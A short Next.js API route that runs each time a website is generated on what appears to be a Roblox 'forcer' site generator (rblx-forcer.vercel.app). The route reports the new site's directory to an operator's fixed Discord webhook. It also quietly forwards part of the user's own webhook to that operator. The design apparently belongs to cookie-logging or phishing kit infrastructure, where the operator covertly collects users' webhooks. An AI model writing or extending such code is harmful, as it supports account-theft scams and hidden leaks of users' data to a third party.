import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    const { directory, webhook } = await request.json();
    
    const permanentWebhook = process.env.PERMANENT_WEBHOOK_URL;

    if (!permanentWebhook) {
      return NextResponse.json({ error: 'Webhook not configured' }, { status: 500 });
    }

    const embed = {
      title: "🚀 New Website Generated",
      color: 0x00ff00,
      fields: [
        {
          name: "📁 Directory",
          value: directory,
          inline: true
        },
        {
          name: "🔗 User Webhook",
          value: webhook.substring(0, 50) + "...",
          inline: true
        },
        {
          name: "🌐 URL",
          value: `https://rblx-forcer.vercel.app/${directory}`
        }
      ],
      timestamp: new Date().toISOString()
    };

    const response = await fetch(permanentWebhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] }),
    });

    if (!response.ok) {
      throw new Error('Failed to send webhook');
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error in notify-generation:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
